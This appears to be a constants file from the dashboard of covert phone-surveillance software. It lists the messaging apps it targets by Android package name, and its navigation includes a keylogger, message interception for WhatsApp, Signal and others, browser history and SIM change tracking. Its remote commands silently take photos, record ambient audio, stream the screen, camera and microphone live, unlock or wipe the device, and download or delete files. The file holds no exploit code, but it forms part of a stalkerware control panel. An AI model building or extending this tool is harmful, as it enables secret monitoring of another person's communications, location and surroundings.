export const SOCIAL_PLATFORMS = [
  { id: 'whatsapp', name: 'WhatsApp', icon: '💬', color: '#25D366', packageName: 'com.whatsapp' },
  { id: 'facebook', name: 'Facebook', icon: '📘', color: '#1877F2', packageName: 'com.facebook.katana' },
  { id: 'facebook_messenger', name: 'Messenger', icon: '🗩', color: '#00B2FF', packageName: 'com.facebook.orca' },
  { id: 'instagram', name: 'Instagram', icon: '📸', color: '#E4405F', packageName: 'com.instagram.android' },
  { id: 'telegram', name: 'Telegram', icon: '✈️', color: '#0088CC', packageName: 'org.telegram.messenger' },
  { id: 'viber', name: 'Viber', icon: '📞', color: '#665CAC', packageName: 'com.viber.voip' },
  { id: 'signal', name: 'Signal', icon: '🔒', color: '#3A76F0', packageName: 'org.thoughtcrime.securesms' },
  { id: 'snapchat', name: 'Snapchat', icon: '👻', color: '#FFFC00', packageName: 'com.snapchat.android' },
  { id: 'skype', name: 'Skype', icon: '☁️', color: '#00AFF0', packageName: 'com.skype.raider' },
  { id: 'line', name: 'LINE', icon: '🟢', color: '#00C300', packageName: 'jp.naver.line.android' },
  { id: 'kik', name: 'Kik', icon: '📱', color: '#82BC23', packageName: 'kik.android' },
  { id: 'wechat', name: 'WeChat', icon: '🗨️', color: '#09B83E', packageName: 'com.tencent.mm' },
  { id: 'tinder', name: 'Tinder', icon: '🔥', color: '#FE3C72', packageName: 'com.tinder' },
  { id: 'discord', name: 'Discord', icon: '🎮', color: '#5865F2', packageName: 'com.discord' },
  { id: 'tiktok', name: 'TikTok', icon: '🎵', color: '#000000', packageName: 'com.zhiliaoapp.musically' },
  { id: 'youtube', name: 'YouTube', icon: '▶️', color: '#FF0000', packageName: 'com.google.android.youtube' },
  { id: 'zoom', name: 'Zoom', icon: '📹', color: '#2D8CFF', packageName: 'us.zoom.videomeetings' },
  { id: 'google_meet', name: 'Google Meet', icon: '🎥', color: '#00897B', packageName: 'com.google.android.apps.meetings' },
  { id: 'reddit', name: 'Reddit', icon: '🤖', color: '#FF4500', packageName: 'com.reddit.frontpage' },
  { id: 'hangouts', name: 'Hangouts', icon: '💬', color: '#0F9D58', packageName: 'com.google.android.talk' },
  { id: 'imo', name: 'imo', icon: '📞', color: '#74A6DB', packageName: 'com.imo.android.imoim' },
  { id: 'gmail', name: 'Gmail', icon: '📧', color: '#D44638', packageName: 'com.google.android.gm' },
  { id: 'tango', name: 'Tango', icon: '💃', color: '#E85E23', packageName: 'com.sgiggle.production' },
  { id: 'hike', name: 'Hike', icon: '🚶', color: '#4BA1E8', packageName: 'com.bsb.hike' },
];

export const CALL_TYPES = [
  { value: 'incoming', label: 'Incoming', color: 'text-green-500', icon: 'PhoneIncoming' },
  { value: 'outgoing', label: 'Outgoing', color: 'text-blue-500', icon: 'PhoneOutgoing' },
  { value: 'missed', label: 'Missed', color: 'text-red-500', icon: 'PhoneMissed' },
  { value: 'rejected', label: 'Rejected', color: 'text-gray-500', icon: 'PhoneOff' },
  { value: 'blocked', label: 'Blocked', color: 'text-gray-800', icon: 'Ban' },
];

export const SMS_TYPES = [
  { value: 'incoming', label: 'Received', color: 'text-green-500', icon: 'ArrowDownLeft' },
  { value: 'outgoing', label: 'Sent', color: 'text-blue-500', icon: 'ArrowUpRight' },
  { value: 'draft', label: 'Draft', color: 'text-gray-500', icon: 'FileEdit' },
];

export const ALERT_SEVERITIES = [
  { value: 'low', label: 'Low', color: 'bg-blue-100 text-blue-800' },
  { value: 'medium', label: 'Medium', color: 'bg-yellow-100 text-yellow-800' },
  { value: 'high', label: 'High', color: 'bg-orange-100 text-orange-800' },
  { value: 'critical', label: 'Critical', color: 'bg-red-100 text-red-800' },
];

export const COMMAND_TYPES = [
  { value: 'take_photo_front', label: 'Take Photo (Front)', icon: 'Camera', description: 'Silently captures a photo using the front camera.' },
  { value: 'take_photo_back', label: 'Take Photo (Back)', icon: 'Camera', description: 'Silently captures a photo using the rear camera.' },
  { value: 'record_audio', label: 'Record Audio', icon: 'Mic', description: 'Records ambient audio for a specified duration.', hasDuration: true },
  { value: 'record_video', label: 'Record Video', icon: 'Video', description: 'Records video from back camera.', hasDuration: true },
  { value: 'start_live_audio', label: 'Start Live Audio', icon: 'Radio', description: 'Starts streaming live audio from device mic.' },
  { value: 'stop_live_audio', label: 'Stop Live Audio', icon: 'StopCircle', description: 'Stops streaming live audio.' },
  { value: 'start_live_video', label: 'Start Live Video', icon: 'Video', description: 'Starts streaming live video.' },
  { value: 'stop_live_video', label: 'Stop Live Video', icon: 'StopCircle', description: 'Stops streaming live video.' },
  { value: 'start_live_screen', label: 'Enable Live Screen', icon: 'MonitorSmartphone', description: 'Starts streaming device screen.' },
  { value: 'stop_live_screen', label: 'Disable Live Screen', icon: 'StopCircle', description: 'Stops streaming device screen.' },
  { value: 'ring_phone', label: 'Ring Phone', icon: 'BellRing', description: 'Rings the device at maximum volume.', hasDuration: true },
  { value: 'vibrate_phone', label: 'Vibrate Phone', icon: 'Vibrate', description: 'Vibrates the phone.', hasDuration: true },
  { value: 'send_sms', label: 'Send SMS', icon: 'MessageSquare', description: 'Sends an SMS from this device.', hasTarget: true },
  { value: 'lock_device', label: 'Lock Device', icon: 'Lock', description: 'Locks the device screen immediately.' },
  { value: 'unlock_device', label: 'Unlock Device', icon: 'Unlock', description: 'Unlocks the device screen.' },
  { value: 'wipe_data', label: 'Wipe Data', icon: 'Eraser', description: 'Wipes all device data! Factory reset.' },
  { value: 'block_app', label: 'Block App', icon: 'ShieldAlert', description: 'Blocks access to a specific app.', hasTarget: true },
  { value: 'unblock_app', label: 'Unblock App', icon: 'ShieldCheck', description: 'Unblocks access to a specific app.', hasTarget: true },
  { value: 'block_website', label: 'Block Website', icon: 'Globe', description: 'Blocks a specific website URL.', hasTarget: true },
  { value: 'unblock_website', label: 'Unblock Website', icon: 'Globe', description: 'Unblocks a website URL.', hasTarget: true },
  { value: 'enable_wifi', label: 'Enable Wi-Fi', icon: 'Wifi', description: 'Turns on device Wi-Fi.' },
  { value: 'disable_wifi', label: 'Disable Wi-Fi', icon: 'WifiOff', description: 'Turns off device Wi-Fi.' },
  { value: 'enable_gps', label: 'Enable GPS', icon: 'MapPin', description: 'Turns on device Location Services.' },
  { value: 'get_location_now', label: 'Get Location Now', icon: 'Navigation', description: 'Requests an immediate location update.' },
  { value: 'update_settings', label: 'Update Settings', icon: 'Settings', description: 'Force sync device settings.' },
  { value: 'restart_service', label: 'Restart Tracker', icon: 'RefreshCw', description: 'Restarts the tracking background service.' },
  { value: 'download_file', label: 'Download File', icon: 'Download', description: 'Downloads a file from device storage.', hasTarget: true },
  { value: 'delete_file', label: 'Delete File', icon: 'Trash2', description: 'Deletes a file from device storage.', hasTarget: true },
];

export const NAV_ITEMS = [
  {
    section: 'Overview',
    items: [
      { title: 'Dashboard', href: '/', icon: 'LayoutDashboard' },
    ]
  },
  {
    section: 'Main Tracking',
    items: [
      { title: 'Devices', href: '/devices', icon: 'Smartphone' },
      { title: 'SMS/MMS', href: '/sms', icon: 'MessageSquare' },
      { title: 'Calls', href: '/calls', icon: 'PhoneCall' },
      { title: 'GPS Locations', href: '/locations', icon: 'MapPin' },
      { title: 'Photos & Videos', href: '/media', icon: 'Image' },
    ]
  },
  {
    section: 'Social Media',
    items: [
      { title: 'WhatsApp', href: '/social/whatsapp', icon: 'MessageCircle' },
      { title: 'Facebook', href: '/social/facebook', icon: 'Facebook' },
      { title: 'Instagram', href: '/social/instagram', icon: 'Instagram' },
      { title: 'Telegram', href: '/social/telegram', icon: 'Send' },
      { title: 'Viber', href: '/social/viber', icon: 'Phone' },
      { title: 'Signal', href: '/social/signal', icon: 'Shield' },
      { title: 'Snapchat', href: '/social/snapchat', icon: 'Ghost' },
      { title: 'Skype', href: '/social/skype', icon: 'Video' },
      { title: 'LINE', href: '/social/line', icon: 'MessageCircle' },
      { title: 'Kik', href: '/social/kik', icon: 'MessageSquare' },
      { title: 'WeChat', href: '/social/wechat', icon: 'MessageCircle' },
      { title: 'Tinder', href: '/social/tinder', icon: 'Flame' },
      { title: 'Discord', href: '/social/discord', icon: 'MessageSquare' },
      { title: 'TikTok', href: '/social/tiktok', icon: 'Video' },
      { title: 'YouTube', href: '/social/youtube', icon: 'Youtube' },
      { title: 'Zoom', href: '/social/zoom', icon: 'Video' },
      { title: 'Google Meet', href: '/social/google-meet', icon: 'Video' },
      { title: 'Reddit', href: '/social/reddit', icon: 'Radio' },
      { title: 'Hangouts', href: '/social/hangouts', icon: 'MessageCircle' },
      { title: 'IMO', href: '/social/imo', icon: 'Phone' },
    ]
  },
  {
    section: 'Internet',
    items: [
      { title: 'Browser History', href: '/browser', icon: 'Globe' },
      { title: 'Bookmarks', href: '/bookmarks', icon: 'Bookmark' },
      { title: 'Emails', href: '/emails', icon: 'Mail' },
      { title: 'Wi-Fi Networks', href: '/wifi', icon: 'Wifi' },
    ]
  },
  {
    section: 'Device Tools',
    items: [
      { title: 'Keylogger', href: '/keylogger', icon: 'Keyboard' },
      { title: 'Notifications', href: '/notifications', icon: 'Bell' },
      { title: 'Contacts', href: '/contacts', icon: 'Users' },
      { title: 'Calendar', href: '/calendar', icon: 'Calendar' },
      { title: 'Installed Apps', href: '/apps', icon: 'Grid' },
      { title: 'App Usage', href: '/app-usage', icon: 'Activity' },
      { title: 'File Explorer', href: '/files', icon: 'Folder' },
      { title: 'Screenshots', href: '/screenshots', icon: 'MonitorSmartphone' },
      { title: 'Ambient Recordings', href: '/ambient', icon: 'Mic' },
    ]
  },
  {
    section: 'Control',
    items: [
      { title: 'Remote Commands', href: '/commands', icon: 'Terminal' },
      { title: 'Device Settings', href: '/settings', icon: 'Settings' },
    ]
  },
  {
    section: 'Reports',
    items: [
      { title: 'Alerts', href: '/alerts', icon: 'AlertTriangle', badge: true },
      { title: 'Statistics', href: '/statistics', icon: 'BarChart' },
      { title: 'Reports', href: '/reports', icon: 'FileText' },
    ]
  },
  {
    section: 'SIM',
    items: [
      { title: 'SIM Changes', href: '/sim-changes', icon: 'CreditCard' },
    ]
  }
];
